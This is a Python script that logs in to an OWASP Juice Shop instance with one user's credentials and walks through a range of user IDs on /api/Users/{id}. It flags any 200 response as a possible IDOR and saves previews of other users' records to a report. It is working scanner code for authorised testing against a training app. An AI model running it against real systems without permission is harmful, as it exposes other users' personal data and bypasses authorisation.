#!/usr/bin/env python3
"""
idor_single_user_scan.py

Authenticated IDOR scan using a single user's credentials.

Usage examples:
  python idor_single_user_scan.py --base https://juice-shop.herokuapp.com --email you@ex.com --password secret --start 1 --end 50
  python idor_single_user_scan.py --base http://localhost:3000 --email you@ex.com --password secret --start 1 --end 20 --out report.json

Notes:
 - Only test targets you control or have permission to test.
"""
import requests
import json
import base64
import time
import argparse
from typing import Optional

LOGIN_PATH = "/rest/user/login"
USER_API_PATH = "/api/Users"   # endpoint template {base}/{USER_API_PATH}/{id}

def login_get_token(base: str, email: str, password: str, timeout=10) -> str:
    url = base.rstrip("/") + LOGIN_PATH
    r = requests.post(url, json={"email": email, "password": password}, timeout=timeout)
    r.raise_for_status()
    data = r.json()
    # Juice Shop returns token in authentication.token or token
    token = data.get("authentication", {}).get("token") or data.get("token")
    if not token:
        raise RuntimeError("Login succeeded but token not found in response.")
    return token

def decode_jwt_payload(token: str) -> Optional[dict]:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        padding = "=" * (-len(payload_b64) % 4)
        decoded = base64.urlsafe_b64decode(payload_b64 + padding)
        return json.loads(decoded)
    except Exception:
        return None

def infer_user_id_from_payload(payload):
    """
    Properly extract user ID from Juice Shop login payload structure.
    The token payload includes:
      {
        "status": "success",
        "data": { "id": <numeric_user_id>, ... },
        "iat": ...
      }
    """
    if not payload:
        return None

    # Juice Shop encodes user object under "data"
    if "data" in payload and isinstance(payload["data"], dict):
        user_data = payload["data"]
        if "id" in user_data:
            return str(user_data["id"])

    # Fallbacks (should rarely be used)
    for key in ("sub", "userId", "uid", "id"):
        if key in payload and str(payload[key]).isdigit():
            return str(payload[key])

    return None

def probe(base: str, token: str, target_id: str, timeout=8):
    url = f"{base.rstrip('/')}{USER_API_PATH}/{target_id}"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=timeout)
        return r.status_code, r.text[:800]
    except requests.RequestException as e:
        return None, str(e)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--base", required=True, help="Base URL (e.g. https://juice-shop.herokuapp.com or http://localhost:3000)")
    p.add_argument("--email", required=True, help="User email to login with")
    p.add_argument("--password", required=True, help="Password")
    p.add_argument("--start", type=int, default=1, help="Start ID (inclusive)")
    p.add_argument("--end", type=int, default=20, help="End ID (inclusive)")
    p.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    p.add_argument("--out", help="Optional JSON output file to save findings")
    args = p.parse_args()

    print("[*] Logging in...")
    token = login_get_token(args.base, args.email, args.password)
    print("[*] Got token (len=%d)" % len(token))
    payload = decode_jwt_payload(token)
    print("[*] Decoded token payload:", json.dumps(payload, indent=2) if payload else "N/A")
    own_id = infer_user_id_from_payload(payload)
    print(f"[*] Inferred own user id: {own_id}")

    findings = []
    for i in range(args.start, args.end + 1):
        sid = str(i)
        if own_id and sid == str(own_id):
            print(f"[skip] id {sid} (your own id)")
            continue
        code, preview = probe(args.base, token, sid)
        if code is None:
            print(f"[err] id {sid} -> error: {preview}")
            continue
        if code == 200:
            print(f"[POSSIBLE IDOR] id {sid} -> 200")
            findings.append({"id": sid, "status": code, "preview": preview})
        elif code in (401, 403):
            print(f"[OK] id {sid} -> {code}")
        elif code in (404, 500):
            print(f"[N/A] id {sid} -> {code}")
        else:
            print(f"[?] id {sid} -> {code}")
        time.sleep(args.delay)

    if findings:
        print("\n=== POSSIBLE IDOR FINDINGS ===")
        for f in findings:
            print(json.dumps(f, indent=2) + "\n")
    else:
        print("\nNo possible IDORs detected in the scanned range.")

    if args.out:
        outdata = {"base": args.base, "scanned_range": [args.start, args.end], "own_id": own_id, "findings": findings}
        with open(args.out, "w") as fh:
            json.dump(outdata, fh, indent=2)
        print(f"Saved report to {args.out}")

if __name__ == "__main__":
    main()
